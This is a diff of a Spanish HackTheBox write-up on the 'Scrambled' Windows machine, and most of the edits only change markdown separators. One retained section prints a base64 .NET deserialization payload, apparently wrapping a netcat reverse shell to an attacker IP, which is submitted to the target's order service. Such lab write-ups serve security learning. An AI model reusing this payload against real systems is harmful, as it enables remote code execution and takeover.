@@ -13,7 +13,7 @@ Estamos ante una máquina Windows de nivel MEDIO bastante compleja, tendremos qu
 
 ![](/assets/images/HTB/Scrambled-HackTheBox/scrambled-rating.webp)
 
-...
+***
 
 
 **Un pequeño INDICE**
@@ -34,12 +34,11 @@ Estamos ante una máquina Windows de nivel MEDIO bastante compleja, tendremos qu
     * [ScrambleClient.exe](#scrambled)
 
 
-
-...
+***
 
 # Reconocimiento [#](reconocimiento) {#reconocimiento}
 
-----
+***
 
 ## Reconocimiento de Puertos [🔍](#recon-nmap) {#recon-nmap}
 
@@ -204,7 +203,7 @@ Lo añadimos al etc/hosts.
 
 # Enumeración [#](enumeración) {#enumeración}
 
-----
+***
 
 ## Enumeración SMB [🔢](#enum-smb) {#enum-smb}
 
@@ -235,7 +234,7 @@ A continuación, ya que no puedo enumerar smb ni tengo ningún hilo del que tira
 
 # Kerberos [#](kerberos) {#kerberos}
 
-----
+***
 
 ## Enumeración Usuarios [🕵️‍♂️](#enum-usuarios) {#enum-usuarios}
 
@@ -519,7 +518,7 @@ Una vez realizamos los pasos hacemos ping desde Windows a la máquina víctima 1
 
 # Escalada de Privilegios Vertical - Usuario Administrador [#](privesc2) {#privesc2}
 
-----
+***
 
 ## ScrambleClient.exe [💻](#scramabled) {#scrambled}
 
@@ -594,7 +593,7 @@ Debemos añadir delante de la data: <span style="color:red">UPLOAD_ORDER;<datase
 
 ```cmd
 # DATA SERIALIZADA
----
+------------------
 C:\Users\W10_CFC\Desktop>nc.exe 10.10.11.168 4411
 SCRAMBLECORP_ORDERS_V1.0.3;
 UPLOAD_ORDER;AAEAAAD/////AQAAAAAAAAAEAQAAAClTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eQEAAAAkU3lzdGVtLlNlY3VyaXR5LkNsYWltc0lkZW50aXR5LmFjdG9yAQYCAAAA+AlBQUVBQUFELy8vLy9BUUFBQUFBQUFBQU1BZ0FBQUY1TmFXTnliM052Wm5RdVVHOTNaWEpUYUdWc2JDNUZaR2wwYjNJc0lGWmxjbk5wYjI0OU15NHdMakF1TUN3Z1EzVnNkSFZ5WlQxdVpYVjBjbUZzTENCUWRXSnNhV05MWlhsVWIydGxiajB6TVdKbU16ZzFObUZrTXpZMFpUTTFCUUVBQUFCQ1RXbGpjbTl6YjJaMExsWnBjM1ZoYkZOMGRXUnBieTVVWlhoMExrWnZjbTFoZEhScGJtY3VWR1Y0ZEVadmNtMWhkSFJwYm1kU2RXNVFjbTl3WlhKMGFXVnpBUUFBQUE5R2IzSmxaM0p2ZFc1a1FuSjFjMmdCQWdBQUFBWURBQUFBMmdVOFAzaHRiQ0IyWlhKemFXOXVQU0l4TGpBaUlHVnVZMjlrYVc1blBTSjFkR1l0TVRZaVB6NE5DanhQWW1wbFkzUkVZWFJoVUhKdmRtbGtaWElnVFdWMGFHOWtUbUZ0WlQwaVUzUmhjblFpSUVselNXNXBkR2xoYkV4dllXUkZibUZpYkdWa1BTSkdZV3h6WlNJZ2VHMXNibk05SW1oMGRIQTZMeTl6WTJobGJXRnpMbTFwWTNKdmMyOW1kQzVqYjIwdmQybHVabmd2TWpBd05pOTRZVzFzTDNCeVpYTmxiblJoZEdsdmJpSWdlRzFzYm5NNmMyUTlJbU5zY2kxdVlXMWxjM0JoWTJVNlUzbHpkR1Z0TGtScFlXZHViM04wYVdOek8yRnpjMlZ0WW14NVBWTjVjM1JsYlNJZ2VHMXNibk02ZUQwaWFIUjBjRG92TDNOamFHVnRZWE11YldsamNtOXpiMlowTG1OdmJTOTNhVzVtZUM4eU1EQTJMM2hoYld3aVBnMEtJQ0E4VDJKcVpXTjBSR0YwWVZCeWIzWnBaR1Z5TGs5aWFtVmpkRWx1YzNSaGJtTmxQZzBLSUNBZ0lEeHpaRHBRY205alpYTnpQZzBLSUNBZ0lDQWdQSE5rT2xCeWIyTmxjM011VTNSaGNuUkpibVp2UGcwS0lDQWdJQ0FnSUNBOGMyUTZVSEp2WTJWemMxTjBZWEowU1c1bWJ5QkJjbWQxYldWdWRITTlJaTlqSUVNNlhGUmxiWEJjYm1NdVpYaGxJQzFsSUhCdmQyVnljMmhsYkd3Z01UQXVNVEF1TVRRdU5DQTBORE1pSUZOMFlXNWtZWEprUlhKeWIzSkZibU52WkdsdVp6MGllM2c2VG5Wc2JIMGlJRk4wWVc1a1lYSmtUM1YwY0hWMFJXNWpiMlJwYm1jOUludDRPazUxYkd4OUlpQlZjMlZ5VG1GdFpUMGlJaUJRWVhOemQyOXlaRDBpZTNnNlRuVnNiSDBpSUVSdmJXRnBiajBpSWlCTWIyRmtWWE5sY2xCeWIyWnBiR1U5SWtaaGJITmxJaUJHYVd4bFRtRnRaVDBpWTIxa0lpQXZQZzBLSUNBZ0lDQWdQQzl6WkRwUWNtOWpaWE56TGxOMFlYSjBTVzVtYno0TkNpQWdJQ0E4TDNOa09sQnliMk5sYzNNK0RRb2dJRHd2VDJKcVpXTjBSR0YwWVZCeWIzWnBaR1Z5TGs5aWFtVmpkRWx1YzNSaGJtTmxQZzBLUEM5UFltcGxZM1JFWVhSaFVISnZkbWxrWlhJK0N3PT0L
@@ -610,7 +609,7 @@ Y ya podemos leer la flag root.txt
 
 ![](/assets/images/HTB/Scrambled-HackTheBox/root.webp)
 
-**PWNED!!!**
+<span style="color:Green">PWNED!!!</span>
 
 ![](/assets/images/HTB/Scrambled-HackTheBox/pwned.webp)
 
